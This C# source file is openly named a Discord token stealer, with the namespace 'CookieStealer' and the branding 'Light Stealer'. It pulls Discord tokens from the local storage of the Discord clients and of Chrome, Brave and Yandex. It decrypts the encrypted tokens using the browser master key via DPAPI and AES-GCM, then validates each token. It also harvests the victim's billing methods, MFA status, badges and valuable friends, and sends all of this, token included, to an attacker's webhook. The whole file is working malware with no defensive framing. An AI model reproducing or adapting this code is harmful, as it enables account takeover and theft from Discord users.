using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;

namespace CookieStealer;

public static class DiscordStealer
{
    private static readonly HttpClient _http = new();

    private static readonly Dictionary<string, string[]> NitroBadges = new()
    {
        ["_nitro"] = new[] {
            "<:boost1month:1387742464202379324>", "<:2monthsboostnitro:1387742437723602975>",
            "<:nitro_boost_3_months:1387742527339102338>", "<:6months_boost:1387742439477088287>",
            "<:nitro_boost_9_months:1387742529289457674>", "<:12monthsboostnitro:1387742435769061417>",
            "<:boost15month:1387742462629511270>", "<:nitro_boost_18_months:1387742525699260538>",
            "<:24_months:1387742436742139974>"
        }
    };

    private static readonly Dictionary<int, string> SubTiers = new()
    {
        [1] = "<:bronze:1387742468727898182>", [3] = "<:silver:1387742580300582974>",
        [6] = "<:gold:1387742520733204480>", [12] = "<:platinum:1387742556649164922>",
        [24] = "<:diamond:1387742491629060156>", [36] = "<:emerald:1387742518153707570>",
        [60] = "<:ruby:1387742559970922496>", [72] = "<:opal:1387742550919614496>"
    };

    private static readonly Dictionary<string, (int value, string emoji, bool rare)> FlagBadges = new()
    {
        ["discord_employee"] = (1, "<:discord_employee:1387742493046734979>", true),
        ["partnered_server_owner"] = (2, "<:partnered_server_owner:1387742553394253834>", true),
        ["hypesquad_events"] = (4, "<:hypesquad_events:1387742522545279056>", true),
        ["bug_hunter_level_1"] = (8, "<:bughunter:1387742487690612887>", true),
        ["house_bravery"] = (64, "<:bravery:1387742465544687707>", false),
        ["house_brilliance"] = (128, "<:brilliance:1387742466697990285>", false),
        ["house_balance"] = (256, "<:balance:1387742461014573058>", false),
        ["early_supporter"] = (512, "<:early_supporter:1387742496796315779>", true),
        ["bug_hunter_level_2"] = (16384, "<:bughuntergold:1387742489338970123>", true),
        ["early_bot_developer"] = (131072, "<:early_verified_bot_developer:1387742498226573342>", true),
        ["certified_moderator"] = (262144, "<:moderatorprogramsalumni:1387742524105429032>", true),
        ["active_developer"] = (4194304, "<:active_developer:1387742440697368606>", true),
        ["legacy_username"] = (32, "<:oldusername:1387742549225115680>", false),
        ["spammer"] = (1048704, "⌨️", false)
    };

    private static (string nitroStr, int boostMonths) GetNitroInfo(JsonElement userData, JsonElement profileData)
    {
        int premiumType = 0;
        if (profileData.TryGetProperty("user", out var pu) && pu.TryGetProperty("premium_type", out var pt))
            premiumType = pt.GetInt32();
        if (premiumType == 0 && userData.TryGetProperty("premium_type", out var upt))
            premiumType = upt.GetInt32();

        string? premiumGuildSince = profileData.TryGetProperty("premium_guild_since", out var pgs) ? pgs.GetString() : null;
        string? premiumSince = profileData.TryGetProperty("premium_since", out var ps) ? ps.GetString() : null;

        if (premiumType == 0 && (premiumSince != null))
            premiumType = 2;

        if (premiumType == 0) return ("❓", 0);

        int boostMonths = 0; string boostEmoji = "";
        if (premiumGuildSince != null)
        {
            try
            {
                var boostDate = DateTimeOffset.Parse(premiumGuildSince);
                boostMonths = (int)((DateTimeOffset.UtcNow - boostDate).TotalDays / 30);
                var nitro = NitroBadges["_nitro"];
                if (boostMonths >= 24) boostEmoji = nitro[8];
                else if (boostMonths >= 18) boostEmoji = nitro[7];
                else if (boostMonths >= 15) boostEmoji = nitro[6];
                else if (boostMonths >= 12) boostEmoji = nitro[5];
                else if (boostMonths >= 9) boostEmoji = nitro[4];
                else if (boostMonths >= 6) boostEmoji = nitro[3];
                else if (boostMonths >= 3) boostEmoji = nitro[2];
                else if (boostMonths >= 2) boostEmoji = nitro[1];
                else boostEmoji = nitro[0];
            }
            catch { }
        }

        string tierEmoji = "<:discord_nitro:1387742494610952194>";
        int subMonths = 0;
        if (premiumSince != null)
        {
            try
            {
                var subDate = DateTimeOffset.Parse(premiumSince);
                subMonths = (int)((DateTimeOffset.UtcNow - subDate).TotalDays / 30);
                foreach (var t in SubTiers.Keys.OrderByDescending(k => k))
                    if (subMonths >= t) { tierEmoji = SubTiers[t]; break; }
            }
            catch { }
        }

        if (premiumType == 1 && string.IsNullOrEmpty(boostEmoji))
            return (tierEmoji, subMonths);

        return ($"{tierEmoji} {boostEmoji}".Trim(), Math.Max(boostMonths, subMonths));
    }

    private static string GetBadges(int flags, string nitroInfo = "")
    {
        string result = (!string.IsNullOrEmpty(nitroInfo) && !nitroInfo.Contains("❓")) ? nitroInfo + " " : "";
        foreach (var (_, info) in FlagBadges)
            if ((flags & info.value) != 0) result += info.emoji + " ";
        return !string.IsNullOrWhiteSpace(result) ? result.Trim() : "`No Badges`";
    }

    private static bool HasRareBadges(int flags, int boostMonths, int subMonths)
    {
        foreach (var (_, info) in FlagBadges)
            if (info.rare && (flags & info.value) != 0) return true;
        return boostMonths >= 9 || subMonths >= 12;
    }

    private static string GetBilling(string token)
    {
        try
        {
            var req = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me/billing/payment-sources");
            req.Headers.Add("authorization", token);
            var response = _http.SendAsync(req).Result;
            var data = JsonDocument.Parse(response.Content.ReadAsStringAsync().Result);
            if (data.RootElement.GetArrayLength() == 0) return "`No Billing`";
            string billings = "";
            foreach (var b in data.RootElement.EnumerateArray())
            {
                int type = b.GetProperty("type").GetInt32();
                if (type == 2) billings += "<:paypal:1367518269719969873> ";
                else if (type == 1) billings += "<:card:1367518257241915483> ";
            }
            return string.IsNullOrEmpty(billings) ? "`No Billing`" : billings;
        }
        catch { return "`None`"; }
    }

    private static (int length, string rare) GetFriends(string token)
    {
        try
        {
            var req = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me/relationships");
            req.Headers.Add("authorization", token);
            req.Headers.Add("User-Agent", "Mozilla/5.0");
            var response = _http.SendAsync(req).Result;
            var data = JsonDocument.Parse(response.Content.ReadAsStringAsync().Result);

            var friends = data.RootElement.EnumerateArray().Where(f => f.GetProperty("type").GetInt32() == 1).ToList();
            var rareFriends = new System.Collections.Concurrent.ConcurrentBag<string>();

            Parallel.ForEach(friends, new ParallelOptions { MaxDegreeOfParallelism = 20 }, f =>
            {
                try
                {
                    string userId = f.GetProperty("user").GetProperty("id").GetString()!;
                    int publicFlags = f.GetProperty("user").TryGetProperty("public_flags", out var pf) ? pf.GetInt32() : 0;
                    string username = f.GetProperty("user").GetProperty("username").GetString()!;

                    var pReq = new HttpRequestMessage(HttpMethod.Get, $"https://discord.com/api/v9/users/{userId}/profile");
                    pReq.Headers.Add("authorization", token);
                    pReq.Headers.Add("User-Agent", "Mozilla/5.0");
                    using var cts = new CancellationTokenSource(5000);
                    var pRes = _http.SendAsync(pReq, cts.Token).Result;
                    var pData = JsonDocument.Parse(pRes.Content.ReadAsStringAsync().Result).RootElement;

                    var (nitroStr, boostMonths) = GetNitroInfo(f.GetProperty("user"), pData);
                    int subMonths = 0;
                    if (pData.TryGetProperty("premium_since", out var pSince) && pSince.GetString() != null)
                    {
                        try
                        {
                            var subDate = DateTimeOffset.Parse(pSince.GetString()!);
                            subMonths = (int)((DateTimeOffset.UtcNow - subDate).TotalDays / 30);
                        }
                        catch { }
                    }

                    if (HasRareBadges(publicFlags, boostMonths, subMonths))
                    {
                        string allBadges = GetBadges(publicFlags, nitroStr);
                        rareFriends.Add($"{allBadges} | `{username}`");
                    }
                }
                catch { }
            });

            string rareStr = rareFriends.Any() ? string.Join("\n", rareFriends) : "**Nothing to see here**";
            return (friends.Count, rareStr);
        }
        catch (Exception e)
        {
            Console.WriteLine($"[-] Error in get_friends: {e.Message}");
            return (0, "**Account Locked or Error**");
        }
    }

    public static void ExtractDiscordTokens()
    {
        Console.WriteLine("[*] Searching for Discord tokens...");
        var tokens = new List<string>();
        string? local = Environment.GetEnvironmentVariable("LOCALAPPDATA");
        string? roaming = Environment.GetEnvironmentVariable("APPDATA");
        if (local == null || roaming == null) return;

        var paths = new Dictionary<string, string>
        {
            ["Discord"] = Path.Combine(roaming, "discord"),
            ["Discord Canary"] = Path.Combine(roaming, "discordcanary"),
            ["Discord PTB"] = Path.Combine(roaming, "discordptb"),
            ["Google Chrome"] = Path.Combine(local, "Google", "Chrome", "User Data", "Default"),
            ["Brave"] = Path.Combine(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            ["Yandex"] = Path.Combine(local, "Yandex", "YandexBrowser", "User Data", "Default")
        };

        var tokenRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}");
        var encTokenRegex = new Regex(@"dQw4w9WgXcQ:([^\""]+)");

        foreach (var (name, path) in paths)
        {
            if (!Directory.Exists(path)) continue;
            string leveldbPath = Path.Combine(path, "Local Storage", "leveldb");
            if (!Directory.Exists(leveldbPath)) continue;

            foreach (var file in Directory.GetFiles(leveldbPath))
            {
                if (!file.EndsWith(".log") && !file.EndsWith(".ldb")) continue;
                try
                {
                    string content = File.ReadAllText(file, Encoding.UTF8);
                    foreach (Match m in tokenRegex.Matches(content))
                        if (!tokens.Contains(m.Value)) tokens.Add(m.Value);

                    foreach (Match m in encTokenRegex.Matches(content))
                    {
                        try
                        {
                            string localStatePath = Path.Combine(Path.GetDirectoryName(Path.GetDirectoryName(leveldbPath))!, "Local State");
                            if (!File.Exists(localStatePath)) continue;
                            var lsData = JsonDocument.Parse(File.ReadAllText(localStatePath));
                            string encKey64 = lsData.RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString()!;
                            byte[] encKey = Convert.FromBase64String(encKey64);
                            byte[] masterKey = CryptoHelper.DpapiUnprotect(encKey[5..]);

                            byte[] tokenData = Convert.FromBase64String(m.Groups[1].Value);
                            byte[] iv = tokenData[3..15];
                            byte[] payload = tokenData[15..];
                            byte[] ciphertext = payload[..^16];
                            byte[] tag = payload[^16..];
                            byte[] decrypted = CryptoHelper.DecryptAesGcm(masterKey, iv, ciphertext, tag);
                            string token = Encoding.UTF8.GetString(decrypted);
                            if (!tokens.Contains(token)) tokens.Add(token);
                        }
                        catch { }
                    }
                }
                catch { }
            }
        }

        if (tokens.Count == 0) { Console.WriteLine("[-] No tokens found."); return; }

        Console.WriteLine($"[+] Found {tokens.Count} token(s). Validating...");
        foreach (var token in tokens)
        {
            try
            {
                var req = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me");
                req.Headers.Add("authorization", token);
                req.Headers.Add("User-Agent", "Mozilla/5.0");
                var response = _http.SendAsync(req).Result;
                var data = JsonDocument.Parse(response.Content.ReadAsStringAsync().Result).RootElement;
                string userId = data.GetProperty("id").GetString()!;
                string username = data.GetProperty("username").GetString()!;
                Console.WriteLine($"[+] Valid token found: {username}");

                JsonElement profileData = default;
                try
                {
                    var pReq = new HttpRequestMessage(HttpMethod.Get, $"https://discord.com/api/v9/users/{userId}/profile");
                    pReq.Headers.Add("authorization", token);
                    pReq.Headers.Add("User-Agent", "Mozilla/5.0");
                    profileData = JsonDocument.Parse(_http.SendAsync(pReq).Result.Content.ReadAsStringAsync().Result).RootElement;
                }
                catch { }

                string billing = GetBilling(token);
                var (friendCount, rareFriends) = GetFriends(token);
                var (nitroStr, _) = GetNitroInfo(data, profileData);
                int publicFlags = data.TryGetProperty("public_flags", out var pfv) ? pfv.GetInt32() : 0;
                string badges = GetBadges(publicFlags, nitroStr);

                string? avatar = data.TryGetProperty("avatar", out var av) ? av.GetString() : null;
                string avatarUrl = avatar != null
                    ? $"https://cdn.discordapp.com/avatars/{userId}/{avatar}.png?size=512"
                    : "https://cdn.discordapp.com/embed/avatars/0.png";

                bool mfa = data.TryGetProperty("mfa_enabled", out var mfaVal) && mfaVal.GetBoolean();

                var payload = new
                {
                    embeds = new object[] {
                        new {
                            title = "📌 Light Stealer - Discord Found",
                            color = 0x808080,
                            thumbnail = new { url = avatarUrl },
                            fields = new object[] {
                                new { name = "Username <:user:1387511745492549632>", value = $"`{username}`", inline = false },
                                new { name = "Token Found <a:blackcrown:1260385770267607103>", value = $"`{token}`", inline = false },
                                new { name = "Badges <:japan:1223077879990980739>", value = string.IsNullOrEmpty(badges) ? "`None`" : badges, inline = true },
                                new { name = "Billing <a:billing:1387892005199282206>", value = billing, inline = true },
                                new { name = "Security <:2fa:1387887545286791320>", value = $"`{(mfa ? "✅ MFA On" : "❌ MFA Off")}`", inline = false }
                            },
                            footer = new { text = "Yigit | t.me/layer7730" }
                        },
                        new {
                            title = $"👑 Rare Friends | Total friends → {friendCount}",
                            color = 0x808080,
                            description = rareFriends,
                            footer = new { text = "Yigit | t.me/layer7730" }
                        }
                    }
                };
                WebhookHelper.SendWebhook(payload);
            }
            catch (Exception e) { Console.WriteLine($"[-] Token validation failed: {e.Message}"); }
        }
    }
}
